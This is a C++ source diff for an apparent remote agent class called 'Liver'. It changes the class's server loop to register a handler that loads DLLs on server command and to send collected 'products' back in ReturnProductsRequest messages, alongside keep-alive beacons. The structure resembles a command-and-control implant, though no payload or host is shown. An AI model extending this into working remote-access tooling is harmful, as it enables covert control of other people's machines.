@@ -1,6 +1,5 @@
 ﻿#include "Include/Liver.hpp"
 
-#include "CommandHandlerFactory.hpp"
 #include "ICommandHandler.hpp"
 #include "Json.hpp"
 #include "LiverConfiguration.hpp"
@@ -9,7 +8,9 @@
 #include "Commands/ICommand.hpp"
 #include "Communicators/RawCommunicator.hpp"
 #include "Communicators/Protocol/KeepAliveRequest.hpp"
+#include "Communicators/Protocol/ReturnProductsRequest.hpp"
 #include "Communicators/Protocol/SendRandomResponse.hpp"
+#include "Handlers/LoadDllHandler.hpp"
 #include "Networking/MaintainedSocket.hpp"
 #include "Synchronization/Event.hpp"
 #include "Utils/Random.hpp"
@@ -18,13 +19,16 @@ Liver::Liver(Event::Ptr quit_event,
              ICommandFactory::Ptr command_factory,
              ICommunicator::Ptr communicator,
              const Time::Duration iteration_delay) :
+	m_liver_id(Random::generate<uint32_t>()),
 	m_quit_event(std::move(quit_event)),
 	m_command_factory(std::move(command_factory)),
 	m_communicator(std::move(communicator)),
 	m_iteration_delay(iteration_delay),
-	m_liver_id(Random::generate<uint32_t>()),
-	libraries()
+	m_products(),
+	m_libraries(std::make_shared<LibrariesContainer>()),
+	m_handlers()
 {
+	register_handlers();
 }
 
 void Liver::run()
@@ -71,7 +75,11 @@ std::wstring Liver::quit_event_name()
 
 IRequest::Ptr Liver::get_next_request()
 {
-	return std::make_unique<KeepAliveRequest>(m_liver_id);
+	if (!m_products.has_new())
+	{
+		return std::make_unique<KeepAliveRequest>(m_liver_id);
+	}
+	return std::make_unique<ReturnProductsRequest>(m_liver_id, m_products.pop_all());
 }
 
 void Liver::handle_response(IResponse::Ptr response)
@@ -109,7 +117,7 @@ void Liver::handle_response(IResponse::Ptr response)
 void Liver::handle_execute_commands(const ExecuteCommandsResponse& response)
 {
 	std::vector<ICommand::Ptr> commands;
-	for (const Buffer& command : response.commands())
+	for (const Command& command : response.commands())
 	{
 		commands.push_back(m_command_factory->create(command));
 	}
@@ -120,7 +128,23 @@ void Liver::execute_commands(const std::vector<ICommand::Ptr>& commands)
 {
 	for (const ICommand::Ptr& command : commands)
 	{
-		const ICommandHandler::Ptr handler = CommandHandlerFactory::create(command);
-		handler->handle(*this);
+		if (!m_handlers.contains(command->type()))
+		{
+			TRACE(L"unhandled command type: ", static_cast<uint32_t>(command->type()));
+			continue;
+		}
+		const ICommandHandler::Ptr& handler = m_handlers[command->type()];
+		std::vector<IProduct::Ptr> products = handler->handle(command);
+		m_products.insert_all(std::move(products));
 	}
+}
+
+void Liver::register_handlers()
+{
+	register_handler(ICommand::Type::LOAD_DLL, std::make_unique<LoadDllHandler>(m_libraries));
+}
+
+void Liver::register_handler(const ICommand::Type type, ICommandHandler::Ptr handler)
+{
+	m_handlers.insert_or_assign(type, std::move(handler));
 }
